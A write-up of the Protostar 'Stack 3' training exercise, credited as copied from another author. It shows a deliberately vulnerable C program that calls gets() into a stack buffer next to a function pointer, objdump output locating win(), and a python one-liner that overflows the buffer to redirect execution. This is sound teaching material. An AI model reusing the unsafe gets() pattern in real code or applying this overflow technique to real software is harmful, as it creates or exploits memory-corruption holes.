# Protostar - Stack 3

> NOTE: This writeup is __not__ written by me, John Hammond. This writeup is shamelessly stolen from [Maxime Peterlin](https://rainbowlyte.com/) (because he has done a much better job than I ever could), and the real original writeup can be found here: [https://github.com/RainbowLyte/writeups/blob/master/exploit-exercises_Protostar/stack3.md](https://github.com/RainbowLyte/writeups/blob/master/exploit-exercises_Protostar/stack3.md)

### About ###

>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
>
>**Hints**
>
> - both gdb and objdump is your friend you determining where the win() function lies in memory.
>
>This level is at `/opt/protostar/bin/stack3`

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Solution 

In this challenge, we still have to change the value of a variable, although this time, it's not a simple integer, it's a function pointer.
The first step is to find the address of the function `win` (I chose `objdump` to do it).

```
08048424 <win>:
 8048424:       55                      push   %ebp
 8048425:       89 e5                   mov    %esp,%ebp
 8048427:       83 ec 18                sub    $0x18,%esp
 804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
 8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
 8048436:       c9                      leave
 8048437:       c3                      ret
```

`0x08048424` is the address of the function `win`.
The remaining steps are the same as the previous exercises: we just need to change the value of `fp` to `0x08048424`.

```
user@protostar:/tmp$ python -c "print 'A'*64+'\x24\x84\x04\x08'" | stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```